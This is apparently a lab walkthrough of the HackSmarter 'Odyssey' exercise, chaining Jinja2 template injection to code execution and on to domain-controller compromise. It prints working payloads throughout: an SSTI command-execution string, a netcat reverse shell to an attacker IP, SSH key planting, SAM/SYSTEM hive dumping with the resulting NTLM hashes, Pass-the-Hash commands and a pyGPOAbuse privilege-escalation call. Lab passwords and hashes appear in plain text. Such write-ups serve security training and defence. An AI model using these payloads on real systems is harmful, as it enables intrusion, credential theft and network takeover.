---
title: "Odyssey - HackSmarter"
description: "A multi-stage penetration testing lab covering Jinja2 SSTI, Linux post-exploitation, credential discovery, Windows Backup Operators abuse, Pass-the-Hash, Active Directory enumeration, and GPO abuse."
date: 2026-08-12
platform: "HackSmarter"
difficulty: "Advanced"
category: "Active Directory"
tags:
  - HackSmarter
  - SSTI
  - Jinja2
  - Linux
  - Windows
  - Backup Operators
  - Pass-the-Hash
  - Active Directory
  - BloodHound
  - bloodyAD
  - GPO
featured: true
draft: false
---

> **Note:** **Disclaimer:** This write-up documents techniques performed inside an authorized HackSmarter lab environment for educational purposes. The techniques described here should only be used against systems you own or have explicit permission to test.


# Scope & Targets

> **Lab:** Odyssey
 > 
> **Platform:** HackSmarter
> 
> **Type:** Black-Box Penetration Test
> 
> **Targets:** Linux Web Server -> Windows Workstation -> Domain Controller
> 
> **Difficulty:** Advanced
> 
> **Focus:** Web Exploitation, Credential Discovery, Windows Privilege Escalation, Active Directory & GPO Abuse
> 

# Introduction

Odyssey is a multi-stage penetration testing lab that simulates an attack against a small enterprise environment.

The objective is not simply to compromise a single machine. Instead, the lab requires us to move through several layers of the infrastructure:

```
Web-01
   v
SSTI -> RCE
   v
SSH Access
   v
Credential Discovery
   v
WKST-01
   v
Backup Operators
   v
SAM + SYSTEM
   v
Credential/Hash Discovery
   v
DC01
   v
Active Directory Enumeration
   v
GPO Abuse
   v
Domain Controller Compromise
```

One of the interesting aspects of this lab is that the Active Directory environment is intentionally degraded. Domain Controller synchronization problems make traditional LDAP enumeration tools such as BloodHound unreliable.

This forces us to adapt our methodology instead of relying entirely on automated enumeration.

## 1. Web-01 Enumeration

---

### Port Enumeration & Service Discovery

We begin with the public-facing Linux server.


I used RustScan to quickly identify exposed services:

```bash
rustscan -a 10.1.35.240 -- -A
```

The important results were:

```bash
22/tcp open ssh 
5000/tcp open http Werkzeug/3.1.3 Python/3.12.3
```

Port `5000` immediately stands out because Werkzeug is commonly associated with Python web applications.

> **Note:** **OPSEC Note:** RustScan is convenient in CTFs and labs, but aggressive scanning can generate significant network traffic. In a real engagement, scan speed and noise should be considered carefully.


---

## 2. SSH Enumeration

Before attacking the web application, I tested SSH to understand the authentication configuration.

```bash
ssh root@10.1.35.240

# Server response:
Permission denied (publickey).
```

This tells us something useful:

**SSH is configured to use public-key authentication rather than accepting a normal password for this account.**

We cannot access the server yet, but this information becomes important later.

---

## 3. Web Application Enumeration

Visiting: `http://10.1.35.240:5000` reveals the **Odyssey Portal**.

The application allows us to submit template-like input.

![Odyssey lab screenshot 1](./OdysseyImg/2.Temp-input.png)

Whenever user-controlled input appears to be processed dynamically by a server-side template engine, several attack classes are worth considering.

Two immediate possibilities are:

- Command Injection
- Server-Side Template Injection (SSTI)

We begin by testing SSTI.

---

## 4. Server-Side Template Injection

We test a mathematical syntax like `{{7*7}}` and see that it is vulnerable.

```bash
{{7*7}}
```

![Odyssey lab screenshot 2](./OdysseyImg/1.SSTI-Syntax.png)

Instead of displaying the expression literally, the application evaluates it.

This confirms **Server-Side Template Injection**

### Identifying the Template Engine

We can go one step further: `{{7*'7'}}`

Different template engines may interpret this expression differently.

For example:

```bash
49       -> commonly associated with Twig behavior
7777777  -> commonly associated with Jinja2 behavior
```

The application returns: `7777777`

![Odyssey lab screenshot 3](./OdysseyImg/3.SSTI-Inject.png)

Combined with the fact that the server is running Python/Werkzeug, this strongly indicates that the application uses **Jinja2**.

Now the important question becomes:

> Can we turn SSTI into Remote Code Execution?
> 

---

## 5. SSTI -> Remote Code Execution

After identifying Jinja2, I tested whether Python objects accessible through the template context could reach operating-system functionality.

**And we found this payload while searching.**

![Odyssey lab screenshot 4](./OdysseyImg/4.SSTI-RCE.png)

- The following payload executes the Linux `id` command:

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

![Odyssey lab screenshot 5](./OdysseyImg/5.SSTI-ID.png)

We now have:

```
SSTI ->Python object access -> OS command execution
```

This confirms **Remote Code Execution (RCE)**.

---

## 6. Reverse Shell

With command execution available, the next step is obtaining an interactive shell.

I started a listener on my attacking machine and used the SSTI vulnerability to execute a BusyBox Netcat reverse shell:

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('busybox nc 10.200.75.51 4444 -e /bin/sh').read()}}
```

![Odyssey lab screenshot 6](./OdysseyImg/6.RevShell.png)

After the payload executes, the server connects back to our listener.

We now have our first foothold on **Web-01**.

---

## 7. Web-01 Initial Enumeration

After obtaining access, I identified the current user:

![Odyssey lab screenshot 7](./OdysseyImg/7.ghill_sa.png)

User :`ghill_sa`

1. From the shell history, we can see that the user had previously worked with SSH keys.
2. Most importantly, I discovered an SSH private key: `~/.ssh/id_ed25519`

![Odyssey lab screenshot 8](./OdysseyImg/8.ssh.png)

Retrieving SSH key for `ghill_sa` from  `id_ed25519` file

```python
-----BEGIN OPENSSH PRIVATE KEY-----
[REDACTED]
-----END OPENSSH PRIVATE KEY-----
```

But we can't connect with this key ???

```python
ssh -i ghill_sa_ssh ghill_sa@10.1.35.240 

ghill_sa@10.1.35.240: Permission denied (publickey).
```

At this point, the private key clearly exists for a reason, but it is not authorized for `ghill_sa` on this host.

> Instead of stopping here, we can use our existing RCE to establish our own SSH persistence.
> 

---

## 8. Establishing SSH Access

```python
# Generate an Ed25519 SSH key pair:
ssh-keygen -t ed25519

# Files created:
~/.ssh/id_ed25519        <- PRIVATE KEY (Keep it a secret)
~/.ssh/id_ed25519.pub    <- PUBLIC KEY (Can be placed on a server)
```

> The private key stays on the attacker machine.
> 

> The public key can safely be placed on the target.
> 

Using the existing SSTI/RCE , I appended my public key to: `/home/ghill_sa/.ssh/authorized_keys`

```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMvg4nET4xWI0e0MOLrwF5z5uvbniaRRfd/KvbR//S48 kali@kali" >> /home/ghill_sa/.ssh/authorized_keys').read()}}
```

![Odyssey lab screenshot 9](./OdysseyImg/9.keys.png)

#### Conceptually

`echo "ATTACKER_PUBLIC_KEY" >> /home/ghill_sa/.ssh/authorized_keys`

Now SSH authentication works because:

```
Attacker Private Key
        v
SSH Authentication
        v
Target authorized_keys
        v
Matching Public Key
        v
Access Granted
```

This gives us a much more stable shell than the original reverse shell.

After we try to connect with SSH server with use our private key and  Web-01 has our Pub_key and will let us connect.

![Odyssey lab screenshot 10](./OdysseyImg/10.keys.png)

---

## 9. Web-01 Privilege Escalation

Looking at `.bash_history`, the user was doing a lot of SSH stuff

![Odyssey lab screenshot 11](./OdysseyImg/11.history.png)

The private SSH key discovered earlier did not authenticate as `ghill_sa`.

But that does not mean the key is useless.

**Since we see that this key has been used somewhere-though we do not know where-we will use it for every user in the system, Or maybe work in Windows Machine ???**

The system had several potential accounts, including:

- ~~ghill_sa~~
- ~~Ubuntu~~
- Root

Testing the recovered key against the root account:

```bash
┌──(global㉿kali)-[~/Desktop]
└─$ ssh root@10.1.35.240 -i ghill_sa_ssh
```

Getting root access to this host with this key

![Odyssey lab screenshot 12](./OdysseyImg/12.root.png)


User Flag : HSM{SFNNeyAxMjM***********************************

---

## 10. Post-Exploitation on Web-01

After compromising a machine, the next objective is not simply collecting the flag.

We need to ask:

> What can this host tell us about the rest of the infrastructure?
> 

I started automated enumeration with LinPEAS while simultaneously performing manual enumeration.

This is useful because automated tools can miss contextual information that becomes obvious when manually reviewing command history and configuration files.

**While manually checking things and waiting for LinPEAS to finish, we notice that the `.bash_history` file is very large, implying it contains a lot of commands.**

![Odyssey lab screenshot 14](./OdysseyImg/13.bash_history.png)

The `.bash_history` file contained references to:

```bash
cat /etc/crontab 
crontab 
crontab -e
cat update.conf | grep -ia ghill_sa -B 5 -A 5
```

That makes `update.conf` worth investigating.

![Odyssey lab screenshot 15](./OdysseyImg/14.update.conf.png)

```bash
root@ip-10-1-35-240:~# cat /etc/update.conf

[auth]
username=ghill_sa
password=P@ssw0rd!
```

We have discovered reusable credentials.

We also identified another internal system: `dc01.hsm.local`

```bash
# Add the host mapping:
10.1.99.58 dc01.hsm.local
```

> At this stage, the attack changes from Linux post-exploitation to **internal network lateral movement**.
> 

---

## 11. Testing Discovered Credentials

**I first tested whether the discovered credentials were valid against the domain controller and its SMB shares.**

```bash
nxc smb dc01.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --shares --smb-timeout 30    
SMB         10.1.242.121    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:hsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.242.121    445    DC01             [-] hsm.local\ghill_sa:P@ssw0rd! STATUS_LOGON_FAILURE                                                                                                         
```

**Forget what I said-we don't have access yet!!!**

> **Finding credentials does not mean they are valid everywhere.**
> 

Next, I tested the workstation using local authentication `WKST-01` ?

```bash
nxc smb wkst01.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth                 
SMB         10.1.65.86      445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:True) (SMBv1:None)
SMB         10.1.65.86      445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! 
```

This time authentication succeeds.

We have discovered that: `ghill_sa:P@ssw0rd!`  is a valid **local account on WKST-01**.

---

## 12. WKST-01 Initial Access

**I then checked whether the account was permitted to authenticate over RDP.**

```bash
nxc rdp wkst01.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth                 

RDP         10.0.17.59      3389   EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! (Pwn3d!)
```

For the lab, I connected using Remmina and obtained full GUI access.

### Operational Consideration

> **Note:** **Interactive GUI access is noisy and would normally be used selectively during a stealth-sensitive engagement. In this authorized lab, it provided a convenient way to continue workstation enumeration.**


**We connect using `Remmina`.**

![Odyssey lab screenshot 16](./OdysseyImg/15.remina.png)

Full GUI Access

---

## 13. Workstation Enumeration

Inside WKST-01, I discovered a `shared` directory containing several files with credentials for different internal services and users.

![Odyssey lab screenshot 17](./OdysseyImg/16.share-folder.png)

Examples included accounts associated with:

```
Finance
HR
Intranet
Operations
Payroll
Procurement
Research
Sales
Support
Training
```

The shared directory exposed several credentials.

![Odyssey lab screenshot 18](./OdysseyImg/17.Credential.png)

This is a significant finding because shared folders containing plaintext credentials can create a direct path for lateral movement.

However, immediately password-spraying all discovered credentials would be risky.

In an Active Directory environment, aggressive authentication attempts can trigger:

```
Account lockouts
SIEM alerts
EDR detections
SOC investigations
```

So instead of blindly spraying credentials, I continued enumerating the workstation.

---

## 14. Discovering Backup Operators

**BloodHound or SharpHound would normally be useful here, but the lab warning suggested that LDAP-derived data could be unreliable.**

> **Note:** Automated LDAP enumeration tools (e.g., BloodHound) are expected to fail or generate unreliable/stale data.


I checked the groups associated with `ghill_sa`:

```bash
C:\Users\ghill_sa>net user ghill_sa
User name                    ghill_sa
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/18/2025 7:36:09 PM
Password expires             Never
Password changeable          11/19/2025 7:36:09 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/2/2026 9:28:12 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Desktop Users
                             *Users
Global Group memberships     *None
```

`Backup Operators` is particularly interesting.

Members of this group can receive powerful privileges related to backing up and restoring files.

Checking privileges revealed:

![Odyssey lab screenshot 19](./OdysseyImg/18.SeBackUpPrivilege.png)

Although `SeBackupPrivilege` initially appeared disabled, the account's group membership still gave us a potential path to sensitive system files.

Our target becomes:

```
SAM
SYSTEM
SECURITY
```

The `SAM` database contains local account password hashes, while `SYSTEM` contains information required to derive the boot key used to decrypt those secrets.

---

## 15. Failed Remote Registry Attempt

My first approach was using Impacket remotely.

Retrieving the SAM hive worked:

```bash
# SAM hive
impacket-reg 'ghill_sa':'P@ssw0rd!'@10.1.65.86 save -keyName 'HKLM\SAM' -o '\\10.200.75.51\hacksmarter'
```

However, attempting the same approach against:

```bash
# SYSTEM hive
impacket-reg 'ghill_sa':'P@ssw0rd!'@10.1.65.86 save -keyName 'HKLM\SYSTEM' -o '\\10.200.75.51\hacksmarter'
```

failed in this environment.

This was one of the parts of the lab where I spent more time than necessary.

Instead of continuing to fight the remote method, I changed the approach:

> Save the registry hives locally first, then transfer them.
> 

This worked.

---

## 16. Extracting SAM and SYSTEM

From the Windows workstation:

```
C:\Windows\System32>reg save HKLM\SYSTEM C:\Users\ghill_sa\Desktop\SYSTEM.save
The operation completed successfully.

C:\Windows\System32>reg save HKLM\SAM C:\Users\ghill_sa\Desktop\SAM.save
The operation completed successfully.
```

Both operations completed successfully.

Now we need to transfer the files back to our attacking machine.

---

## 17. SMB File Transfer

**We create an SMB server on our Linux system.**

```bash
impacket-smbserver -smb2support -username test -password test MyServer .
```

**From WKST-01, I access our SMB folder and transfer the files.**

![Odyssey lab screenshot 20](./OdysseyImg/19.SMBShare.png)

We now have: `SAM.save` and `SYSTEM.save` on our attacking machine.

---

## 18. Dumping Local Password Hashes

With both registry hives available, we can use Impacket's `secretsdump`:

```bash
secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL                        
Impacket v0.14.0.dev0+20260619.174856.9a5621d4 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x7c7cfe4ff1d4639aaa93ddd2be306cc0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d5cad8a9782b2879bf316f56936f1e36:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
ghill_sa:1000:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
fin_user1:1001:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
hr_admin:1002:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
proj_mgr:1003:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
db_readonly:1004:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
audit_user:1005:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
payroll_clerk:1006:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
vpn_user:1007:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
intranet_admin:1008:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
inv_user:1009:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
training_user:1010:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
devops_user:1011:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
support_staff:1012:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
mktg_user:1013:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
sales_rep:1014:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
legal_user:1015:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
ops_mgr:1016:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
eng_user:1017:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
procure_user:1018:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
facilities_user:1019:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
research_user:1020:aad3b435b51404eeaad3b435b51404ee:5d9dc889caa181140f5ec16016ab3754:::
bbarkinson:1021:aad3b435b51404eeaad3b435b51404ee:53c3709ae3d9f4428a230db81361ffbc:::
[*] Cleaning up... 
                   
```

The tool extracts the local SAM hashes.

One account immediately caught my attention:

```bash
bbarkinson:1021:aad3b435b51404eeaad3b435b51404ee:53c3709ae3d9f4428a230db81361ffbc::
```

Unlike many of the other accounts, its naming pattern looked different.

---

## 19. Administrator Pass-the-Hash

The dump also gave us the local Administrator NTLM hash.

Instead of cracking it, we can test whether the environment accepts NTLM authentication directly.

This technique is known as: `Pass-the-Hash (PtH).`

**When we try to connect, we get restricted.**

```bash
xfreerdp3 /v:10.1.40.34 /u:'Administrator' /pth:'d5cad8a9782b2879bf316f56936f1e36'
```

![Odyssey lab screenshot 21](./OdysseyImg/20.Restricted.png)

**I therefore tested the hash over SMB with NetExec and confirmed that it was valid.**

```bash
nxc smb 10.1.40.34 -u 'Administrator' -H 'd5cad8a9782b2879bf316f56936f1e36' --local-auth -x whoami --smb-timeout 30
SMB         10.1.40.34      445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:True) (SMBv1:None)
SMB         10.1.40.34      445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\Administrator:d5cad8a9782b2879bf316f56936f1e36 (Pwn3d!)
SMB         10.1.40.34      445    EC2AMAZ-NS87CNK  [+] Executed command via wmiexec
SMB         10.1.40.34      445    EC2AMAZ-NS87CNK  ec2amaz-ns87cnk\administrator

```

We now have administrative execution on the workstation.

---

## 20. Adding Our User to Administrators

**An initial attempt to add the user to the local Administrators group through remote command execution was blocked in the lab environment.**

```bash
nxc smb 10.1.40.34 -u 'Administrator' -H 'd5cad8a9782b2879bf316f56936f1e36' --local-auth -x 'net localgroup Administrators ghill_sa /add' --smb-timeout 30
```

![Odyssey lab screenshot 22](./OdysseyImg/21.EDR.png)

**Using `impacket-net` provided an alternative way to perform the same authorized administrative change.**

```bash
impacket-net 'Administrator'@10.1.40.34 -hashes ':d5cad8a9782b2879bf316f56936f1e36' localgroup -name Administrators -join ghill_sa

[*] Adding user account 'ghill_sa' to group 'Administrators'
[+] User account added to Administrators successfully!
```

This succeeds: User account added to Administrators successfully!

Our existing user now belongs to the local Administrators group.

This gives us full administrative access to WKST-01.

We open cmd as an administrator, since our user '`ghill_sa`' is part of the administrators group and can view files on the admin desktop.

```bash
C:\Users\Administrator\Desktop>type user2.txt
[REDACTED FLAG]
```

---

## 21. Moving Toward the Domain Controller

At this point, Web-01 and WKST-01 are compromised.

The remaining target is: `DC01.hsm.local`  with IP **`10.1.99.58`**   

Remember the unusual account discovered in the SAM dump: `bbarkinson`

I tested its NTLM hash against DC01:

```bash
nxc smb dc01.hsm.local -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc' --shares
SMB         10.1.50.55      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:hsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.50.55      445    DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc 
SMB         10.1.50.55      445    DC01             [*] Enumerated shares
SMB         10.1.50.55      445    DC01             Share           Permissions     Remark
SMB         10.1.50.55      445    DC01             -----           -----------     ------
SMB         10.1.50.55      445    DC01             ADMIN$                          Remote Admin
SMB         10.1.50.55      445    DC01             C$                              Default share
SMB         10.1.50.55      445    DC01             IPC$            READ            Remote IPC
SMB         10.1.50.55      445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.50.55      445    DC01             SYSVOL          READ            Logon server share 

```

Authentication succeeds:

The attack path is now:

```
WKST-01
   v
SAM/SYSTEM extraction
   v
bbarkinson NTLM hash
   v
Pass-the-Hash
   v
DC01 authentication
```

---

## 22. Active Directory Enumeration

Normally, one of my first choices would be BloodHound/SharpHound.

However, the lab specifically warns us that the Domain Controllers are experiencing synchronization issues and that standard LDAP enumeration may return stale or unreliable information.

I still tested NetExec's BloodHound collection:

```bash
nxc ldap dc01.hsm.local -u 'bbarkinson' -H '53c3709ae3d9f4428a230db81361ffbc' --bloodhound --collection ALL
LDAP        10.1.50.55      389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:hsm.local) (signing:Enforced) (channel binding:No TLS cert) 
```

This collection attempt failed in the lab environment.

---

## 23. Collecting BloodHound Data with bloodyAD

**Because the first collection method failed, I switched to `bloodyAD` as an alternative collection method.**

This successfully collected information including:

```bash
bloodyAD --host 10.1.50.55 -d hsm.local -u bbarkinson -p ':53c3709ae3d9f4428a230db81361ffbc' get bloodhound 

[+] Connecting to LDAP server
[+] Connected to LDAP server
Dumping schema: 2it [00:00,  2.54it/s]
Generating lookuptable: 81it [00:01, 43.92it/s]
Dumping SDs: 100%|███████████████████████████████████████████████████████████████████| 85/85 [00:12<00:00,  7.08it/s]
Dumping domains: 100%|█████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  2.52it/s]
Dumping users: 100%|███████████████████████████████████████████████████████████████████| 4/4 [00:00<00:00, 28.42it/s]
Dumping computers: 100%|███████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 13.59it/s]
Dumping groups: 100%|███████████████████████████████████████████████████████████████| 51/51 [00:00<00:00, 313.53it/s]
Dumping GPOs: 100%|████████████████████████████████████████████████████████████████████| 3/3 [00:00<00:00, 23.94it/s]
Dumping OUs: 100%|█████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  7.77it/s]
Dumping Containers: 100%|███████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 117.81it/s]
[+] Bloodhound data saved to 20260807T113053_Bloodhound.zip
[+] Found 0 trusts
```

This is one of the most important lessons from Odyssey:

> When your preferred enumeration tool fails, do not assume the attack path is gone. Change the collection method.
> 

---

## 24. Discovering a GPO Abuse Path

Analyzing the collected Active Directory relationships revealed that `bbarkinson` had permissions that could be abused against a Group Policy Object.

At this point, the attack becomes a **GPO abuse** scenario.

**BloodHound recommends using `pyGPOAbuse` for this abuse.**

![Odyssey lab screenshot 23](./OdysseyImg/22.GPO.png)

---

## 25. Testing pyGPOAbuse

**I then reviewed the required `pyGPOAbuse` syntax and the GPO identifier discovered through the collected relationship data.**

![Odyssey lab screenshot 24](./OdysseyImg/24.GPOAbuse.png)

1. Obtain the GPO ID from BloodHound 

```bash
526CDF3A-10B6-4B00-BCFA-36E59DCD71A2
```

First, I tested whether the identified GPO could actually be modified:

```bash
python3 pygpoabuse.py hsm.local/bbarkinson -hashes aad3b435b51404eeaad3b435b51404ee:53c3709ae3d9f4428a230db81361ffbc  -gpo-id "526CDF3A-10B6-4B00-BCFA-36E59DCD71A2"
[+] ScheduledTask TASK_aa22559c created!
```

The tool successfully created a scheduled task:
This confirms that the GPO permissions are exploitable.

The GPO ID can be identified in the BloodHound relationship data.
![Odyssey lab screenshot 24](./OdysseyImg/25.GPOID.png)


At this stage, the GPO control could be abused in multiple ways. For the lab, two practical options were:

1. Run reverse shell on the system
2. Add the compromised user to the local Administrators group

For this lab, I chose to add the compromised account to the local Administrators group.

---

## 26. GPO Abuse -> Administrator

The payload was:

```bash
python3 pygpoabuse.py hsm.local/bbarkinson -hashes :53c3709ae3d9f4428a230db81361ffbc  -gpo-id "526CDF3A-10B6-4B00-BCFA-36E59DCD71A2" -command 'net localgroup Administrators  bbarkinson /add' -f
[+] ScheduledTask TASK_b2043872 created!
```

The malicious scheduled task was successfully created.

After the policy took effect, `bbarkinson` gained administrative privileges.

---

## 27. Domain Controller Access

After the policy was applied, I tested remote access using the newly granted privileges.

```bash
evil-winrm -i dc01.hsm.local -u bbarkinson -H 53c3709ae3d9f4428a230db81361ffbc
```

Checking the account:

```bash
*Evil-WinRM* PS C:\Users\bbarkinson\Documents> net user bbarkinson
 
User name                    bbarkinson
Full Name
Comment                      Finance department account
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/18/2025 8:27:50 PM
Password expires             Never
Password changeable          11/19/2025 8:27:50 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/7/2026 11:30:52 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

We have successfully escalated our access and compromised DC01.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt

[REDACTED FLAG]
```

---

## Attack Path Summary

```bash
The final attack path looked like this:

                    ┌──────────────────────┐
                    │        Web-01        │
                    └──────────┬───────────┘
                               │
                              SSTI
                               │
                               v
                         Jinja2 RCE
                               │
                               v
                         Reverse Shell
                               │
                               v
                       SSH Persistence
                               │
                               v
                         Root via SSH Key
                               │
                               v
                    Credential Discovery
                               │
                               v
                    ghill_sa:P@ssw0rd!
                               │
                               v
                    ┌──────────────────────┐
                    │       WKST-01        │
                    └──────────┬───────────┘
                               │
                        Backup Operators
                               │
                               v
                     SAM + SYSTEM Dump
                               │
                               v
                         secretsdump
                               │
                 ┌─────────────┴────────────┐
                 │                          │
                 v                          v
         Administrator Hash          bbarkinson Hash
                 │                          │
                 v                          v
        Local Administrator          Domain Access
                                            │
                                            v
                                    ┌───────────────┐
                                    │     DC01      │
                                    └───────┬───────┘
                                            │
                                      bloodyAD
                                            │
                                            v
                                    BloodHound Data
                                            │
                                            v
                                      GPO Control
                                            │
                                            v
                                      pyGPOAbuse
                                            │
                                            v
                                      Administrator
                                            │
                                            v
                                  DOMAIN CONTROLLER
                                     COMPROMISED
```

---

## What I Learned

Odyssey was particularly valuable because the lab was not based around a single vulnerability.

### 1. Enumeration is more important than exploitation

The initial SSTI vulnerability gave us access to only one server.

What allowed the attack to continue was the information discovered afterward:

```
SSH keys
Command history
Configuration files
Credentials
Local groups
Registry hives
NTLM hashes
Active Directory permissions
```

A foothold is only the beginning.

---

### 2. Credentials should be treated as reusable attack material

The credentials discovered on Web-01 did not authenticate to DC01, but they worked against WKST-01.

---

### 3. Group membership can be more important than the username

The `ghill_sa` account initially looked like a normal user.

But: `Backup Operators`  changed the entire situation.

That membership eventually allowed us to access sensitive registry data and recover password hashes.

Always enumerate:

```
whoami /priv
whoami /groups
net user <username>
```

A low-privileged-looking account may have dangerous rights.

---

### 4. Failed techniques are part of the methodology

Several approaches did not work immediately:

```
Recovered SSH key -> failed for ghill_sa
Remote SYSTEM hive extraction -> failed
Standard BloodHound collection -> unreliable
Initial credential use against DC01 -> failed
```

But none of these failures ended the attack.

Instead:

```
SSH failure
   -> test another account

Remote registry failure
   -> dump locally and transfer

BloodHound failure
   -> change collection method

Domain authentication failure
   -> test another host/context
```

This was probably the most useful lesson from the lab.

> **Do not become dependent on one tool or one technique. Understand what you are trying to achieve, then find another way to achieve it.**
> 

---

### 5. Local compromise can become domain compromise

The most interesting transition was:

```
Local workstation access
        v
Registry hive extraction
        v
NTLM hashes
        v
Domain-valid account
        v
Active Directory permissions
        v
GPO abuse
        v
DC compromise
```

This demonstrates why credential hygiene and workstation security are critical in enterprise environments.

---

### 6. BloodHound is not the attack-it is a way to understand relationships

When the normal BloodHound collection path became unreliable, the solution was not to stop Active Directory enumeration.

The objective was still to understand:

```
Who controls what?
Which user has which permissions?
Which objects can be modified?
What path leads to higher privileges?
```

Using another collection method allowed us to answer those same questions.

---

## Final Thoughts

Odyssey was a great example of what makes enterprise penetration testing interesting.

The lab started with a relatively straightforward web vulnerability:

```
SSTI -> RCE
```

but quickly evolved into:

```
Linux Post-Exploitation
        v
Credential Discovery
        v
Lateral Movement
        v
Windows Privilege Escalation
        v
Credential Dumping
        v
Pass-the-Hash
        v
Active Directory Enumeration
        v
GPO Abuse
        v
Domain Controller Compromise
```

The biggest takeaway for me was that successful penetration testing is not about running as many tools as possible.

It is about understanding **why** each piece of information matters and connecting individual findings into an attack path.

A password in a configuration file may look like a small finding.

A membership in `Backup Operators` may look like another.

A reused NTLM hash may look like another.

A misconfigured GPO permission may look like another.

But when those weaknesses are chained together:

```
Small Misconfiguration
        +
Credential Exposure
        +
Excessive Privileges
        +
Credential Reuse
        +
Active Directory Misconfiguration
        =
Domain Compromise
```

That is what made Odyssey such a valuable lab for practicing a real penetration-testing mindset.
